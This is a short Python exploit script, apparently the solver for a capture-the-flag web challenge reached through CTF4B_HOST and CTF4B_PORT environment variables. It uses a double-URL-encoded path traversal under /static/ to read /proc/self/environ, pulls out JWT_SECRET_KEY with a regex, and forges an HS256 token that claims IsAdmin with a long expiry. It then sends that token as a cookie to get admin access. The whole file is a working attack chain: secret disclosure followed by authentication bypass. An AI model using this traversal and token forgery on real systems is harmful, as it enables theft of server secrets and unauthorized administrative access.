import re, os
import requests
import jwt
import time


def crawl(url):
    try:
        s = requests.Session()
        req = requests.Request(
            method="GET",
            url=url,
        )
        prep = req.prepare()
        prep.url = url + "/static/%252e%252e%252f%252e%252e%252fproc/self/environ"
        res = s.send(prep, verify=False, timeout=3)
        res.raise_for_status()
        m = re.search(r"JWT_SECRET_KEY=(.*)SHLVL=", res.text)
        secret_key = m.group(1)[0:32]
        print(secret_key)

        header = {"typ": "JWT", "alg": "HS256"}
        payload = {
            "exp": int(time.time()) + 1000000,
            "Username": "test",
            "IsAdmin": True,
        }
        token = jwt.encode(
            payload=payload,
            key=secret_key,
            algorithm="HS256",
            headers=header,
        )
        print(token)

        cookies = dict(JWT_KEY=token)
        r = requests.get(url, cookies=cookies, timeout=3)
        print(r.text)
        return 0
    except Exception as e:
        print(e)
        return 2


if __name__ == "__main__":
    # print(crawl("http://localhost"))
    print(crawl("https://{}:{}".format(os.getenv("CTF4B_HOST"), os.getenv("CTF4B_PORT"))))
